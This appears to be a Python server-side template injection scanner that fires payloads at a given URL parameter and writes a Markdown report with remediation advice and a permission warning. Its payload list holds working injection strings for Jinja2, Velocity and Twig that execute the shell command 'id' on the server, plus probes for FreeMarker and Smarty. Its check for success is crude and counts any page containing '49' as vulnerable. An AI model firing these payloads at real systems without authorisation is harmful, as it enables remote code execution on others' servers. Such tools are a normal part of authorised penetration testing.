#!/usr/bin/env python3
"""
SSTI (Server-Side Template Injection) Tester
Tests for template injection vulnerabilities.
"""

import sys
import requests
from typing import List

class SSTITester:
    def __init__(self, url: str):
        self.url = url
        self.payloads = {
            'jinja2': [
                '{{7*7}}',
                '{{config}}',
                '{{self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}'
            ],
            'freemarker': [
                '${7*7}',
                '${product.getClass().getProtectionDomain().getCodeSource().getLocation()}'
            ],
            'velocity': [
                '#set($x=7*7)${x}',
                '$product.getClass().forName("java.lang.Runtime").getRuntime().exec("id")'
            ],
            'smarty': [
                '{7*7}',
                '{php}echo "test";{/php}'
            ],
            'twig': [
                '{{7*7}}',
                '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'
            ]
        }
        self.vulnerable = False
        self.template_engine = None
    
    def test_ssti(self, param: str) -> bool:
        """Test for SSTI vulnerability"""
        print(f"[*] Testing SSTI in parameter: {param}")
        
        for engine, payloads in self.payloads.items():
            for payload in payloads:
                try:
                    response = requests.get(
                        self.url,
                        params={param: payload},
                        timeout=10
                    )
                    
                    # Check for template execution indicators
                    if '49' in response.text or 'id=' in response.text.lower():
                        print(f"[+] Potential SSTI found! Template engine: {engine}")
                        self.vulnerable = True
                        self.template_engine = engine
                        return True
                except:
                    pass
        
        return False
    
    def generate_report(self) -> str:
        """Generate SSTI test report"""
        report = f"# SSTI Test Report for {self.url}\n\n"
        
        if self.vulnerable:
            report += f"⚠️ **VULNERABLE**: SSTI vulnerability detected!\n\n"
            report += f"**Template Engine**: {self.template_engine}\n\n"
        else:
            report += "✅ No SSTI vulnerability detected.\n\n"
        
        report += "## Tested Payloads\n\n"
        for engine, payloads in self.payloads.items():
            report += f"### {engine.upper()}\n\n"
            for payload in payloads:
                report += f"- `{payload}`\n"
            report += "\n"
        
        report += "## Recommendations\n\n"
        report += "1. Use static templates when possible\n"
        report += "2. Sanitize user input\n"
        report += "3. Use sandboxed template environments\n"
        report += "4. Disable dangerous template functions\n\n"
        
        return report

def main():
    if len(sys.argv) < 3:
        print("Usage: python ssti_tester.py <url> <parameter>")
        print("Example: python ssti_tester.py http://example.com/render template")
        sys.exit(1)
    
    url = sys.argv[1]
    param = sys.argv[2]
    
    tester = SSTITester(url)
    tester.test_ssti(param)
    
    report = tester.generate_report()
    
    filename = "ssti_test_report.md"
    with open(filename, 'w') as f:
        f.write(report)
    
    print(f"[+] SSTI testing complete")
    print(f"[+] Report saved to {filename}")
    print(f"[!] WARNING: Only test applications you own or have permission to test!")

if __name__ == '__main__':
    main()


